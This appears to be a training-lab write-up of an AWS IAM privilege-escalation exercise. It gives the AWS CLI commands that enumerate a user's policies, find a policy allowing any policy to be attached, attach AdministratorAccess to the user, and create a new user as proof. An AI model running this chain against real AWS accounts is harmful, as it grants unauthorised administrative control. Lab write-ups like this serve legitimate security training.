### Overly Permissive Permission I

# Pre Requisite

This exercise needs to have the profile configured, this is provided by PT Academy

# Workaround

This exercise start by listing the attached user policies of user student `aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222626674-edfff9fa-1cdf-40fb-9594-b98d98c648db.png)

Image above shows a `service` policy, lets show its details `aws iam get-policy --policy-arn arn:aws:iam::800637287098:policy/Service --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222626997-17ad6575-781f-444d-a431-85c183ac64e9.png)

To view policy details for the v1 version of Service policy execute `aws iam get-policy-version --policy-arn arn:aws:iam::800637287098:policy/Service --version-id v1 --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222627279-37f1e948-9841-42e2-8590-cd8f199cc7ac.png)

This policy allows to attach any policy to any user. For example if we try to create the user `jllerena` a denied message will be obtained 

![image](https://user-images.githubusercontent.com/46797181/222627762-0b337083-a0ee-4246-b67d-993c7d86df28.png)

Next step is to get the administrator policy, first the arn of this policy is needed to get with `aws iam list-policies --profile PTAcademyJllerena | grep 'AdministratorAccess'` 
![image](https://user-images.githubusercontent.com/46797181/222628339-e882c574-1145-4213-aeb1-4efe4b4ec72d.png)

The arn has been obtained for policy `AdministratorAccess` now attaching this policy if possible with `aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile PTAcademyJllerena`

Once the policy is attached, lets list again the attached policies for user `student` -> `aws iam list-attached-policies --user-name student`

![image](https://user-images.githubusercontent.com/46797181/222628997-d52f47eb-0847-4408-9e48-eefcdad10943.png)

Attempting again to create user `jllerena` with `aws iam create-user --user-name jllerena --profile PTAcademyJllerena` 
![image](https://user-images.githubusercontent.com/46797181/222629311-7b6083db-23bf-4851-8d01-7e4623888543.png)

In above image it is shown that privilege escalation has been obtained. 


